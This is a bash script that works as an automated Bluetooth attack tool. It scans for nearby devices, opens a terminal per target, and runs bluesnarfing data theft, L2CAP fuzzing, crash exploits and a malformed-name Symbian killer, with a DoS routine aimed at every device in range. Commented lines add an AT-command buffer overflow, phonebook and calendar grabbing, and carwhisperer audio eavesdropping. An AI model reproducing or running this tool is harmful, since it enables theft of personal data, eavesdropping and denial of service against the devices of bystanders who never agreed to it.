#!/bin/bash

device=hci0

################################################################################

# make sure we always find our tools
path=$(dirname $0)
export PATH=$PATH:$path:$path/tools

# a counter. guess what it's for.
total_targets=0

# returns current device btaddr
get_device_btaddr()
{
	hciconfig $device | awk '/Address/{print $3}'
}

# $1 = btaddr to change for local device
set_device_btaddr()
{
	#bccmd  -d %s psset -r bdaddr 0x%s 0x%s 0x%s 0x%s 0x%s 0x%s 0x%s 0x%s
	bdaddr -i $device $1
        bccmd  -d $device warmreset
        hciconfig $device reset
        hciconfig $device revision
}

# returns current device name
get_device_name()
{
	hciconfig $device name | awk '/Name:/{print $2}'
}

# $1 = name to change local device to
set_device_name()
{
	hciconfig $device name "$1"
}

get_target_info()
{
	hcitool info $1
	sdptool browse $1 | grep -E "Service Name|Channel"
}

get_current_ssp_mode()
{
	local ssp
	ssp=$(hciconfig $device sspmode | awk '/Pairing/{print $4}')
	[ "${ssp^^}" == "DISABLED" ] && echo "0" || echo "1"
}

# $1 = target client btaddr to spoof
# $2 = target master btaddr to reject on the spoofed behalf
reset_connection_via_l2cap_command_rej()
{
	set_device_btaddr $1
	l2cappacket -a $2 -c 1
}

# $1 = symbian btaddr to kill
kill_symbian()
{
	oldname=$(get_device_name)
	set_device_name "$(echo -e "${oldname}\x09\x0a")"
	l2ping -c 1 $1
	sleep 1
	l2ping -c 1 $1
	set_device_name $oldname
}

# $1 = btaddr to exploit
exploit_target()
{
	bss -m 0 $1
	l2cap_headersize_overflow $1
	hcidump_crash $1
	kill_symbian $1
}

# $1 = btaddr of target to fuzz
fuzz_target()
{
	size=42
	target=$1
	while :; do 
		for i in {1..11}; do 
			l2cap-packet -a $target -c $i -s $size -i 999999 -p "$(dd if=/dev/urandom count=22 bs=1)"
		done
	done
}

# $1 = btaddr to probe
probe_target()
{
	target=$1
	get_target_info $target
	for channel in 2 3 4 5 10 12 19; do
		# try some basic stuff
		#btftp $target $channel
		attest $target $channel

		# try to grab phonebook & calendar info
		#btobex pb $target $channel
		#btobex cal $target $channel

		# send/recv raw audio file
		#carwhisperer 0 $path/tools/wav.raw - $target $channel | mplayer -rawaudio samplesize=2:channels=1:rate=8000 -demuxer rawaudio

# for carwhisperer:
# mplayer -rawaudio samplesize=2:channels=1:rate=8000 -demuxer rawaudio file.raw
# sox -t raw -b 16 -e signed-integer -r 8000 -c1 in.raw out.wav
# sox -t wav -r 44100 -c 2 in.wav -t raw -b 16 -e signed-integer -r 8000 -c 1 out.raw
#?sox in.wav -b 16 -e signed-integer --endian little out.raw

		# basic BOF
		#printf 'AT+BRSF=%100s\\nquit\\n' | tr " " "A" | atshell $target $channel
	done
	# send vcard
	#btobex push $target $path/tools/easterhegg.vcf

	# bluesnarf
	bluesnarfer -i -b $target

	# bluesmack
	#l2ping -f -s 667 $target

	#fuzz_target $target
}

# $1 = btaddr to scan
# $2 = optional rssi (for title only)
scan_target()
{
	bdaddr=$1
	rssi=$2
	#printf '%80s\n' "[$bdaddr]   " | tr " " "="
	# calc geometry of the new xterm window
	geo=$((total_targets*30))
	# source the functions so we can transfer them to the new xterm shell
	src_probe_target=$(type probe_target | tail -n +2)
	src_get_target_info=$(type get_target_info | tail -n +2)
	src_fuzz_target=$(type fuzz_target | tail -n +2)
	xterm -si -sk -rv -geometry 100x40+$geo+$geo -hold -T "$bdaddr $rssi" \
		-e "$src_probe_target; $src_fuzz_target; $src_get_target_info; \
		probe_target $bdaddr" &
	((total_targets++))
}

# try to kill any bt device around
kill_targets()
{
	xterm -si -sk -rv -geometry -0-0 -sl 10000 -T "Killing All Targets" \
		-hold -e "bt_dos" &
	sleep 1
}

# loop over hcidump results to find targets
find_targets()
{
	local line
	local last_line
	# start monitoring in a new terminal
	xterm -si -sk -rv -geometry 100x40-0+0 -sl 10000 -T "Bluetooth Monitor" \
		-e "btmon -tTS" &
	#(sleep 1 && wmctrl -r "Bluetooth Monitor" -b add,above) &
	stdbuf -oL hcidump | while read -r line; do
		# don't repeat boring lines
		[ "$line" == "$last_line" ] && continue
		declare -a params=($line)
		if [ "${params[0]}" == "bdaddr" ]; then
			echo "$line"
			last_line="$line"
			bdaddr="${params[1]}"
			if [[ ! "$targets" =~ "$bdaddr" ]]; then
				targets+="$bdaddr "
				rssi="${params[9]}"
				scan_target "$bdaddr" "$rssi"
			fi;
		fi
	done
}

# set HCI device in inquiry mode
init_device()
{
	hciconfig $device up
	# start periodic inquiry
	hcitool -i $device spinq
	# make device discoverable
	hciconfig $device piscan
	# change class to 'desktop'
	hciconfig $device class 0x5a0100
	if [ ! -d /dev/bluetooth/rfcomm ]; then
		mkdir -p /dev/bluetooth/rfcomm
		mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
	fi
}

setup_device()
{
	# save current values
	org_ssp="$(get_current_ssp_mode)"
	org_name="$(get_device_name)"
	org_btaddr=$(get_device_btaddr)
	# enable ssp mode
	hciconfig $device sspmode 1
	# set malicious device name (hex codes)
	set_device_name "$(echo -e "$(printf "\x%x" `seq 1 255` 2>/dev/null)")"
	# restore changes on exit
	trap "hciconfig $device sspmode $org_ssp; \
	      set_device_name \"$org_name\"; \
	      set_device_btaddr $org_btaddr >/dev/null 2>&1;" \
	      INT HUP QUIT TERM 
}

check_root()
{
	[ $UID == 0 ] || { echo "must be root"; exit 1; }
}

check_root
setup_device
init_device
find_targets
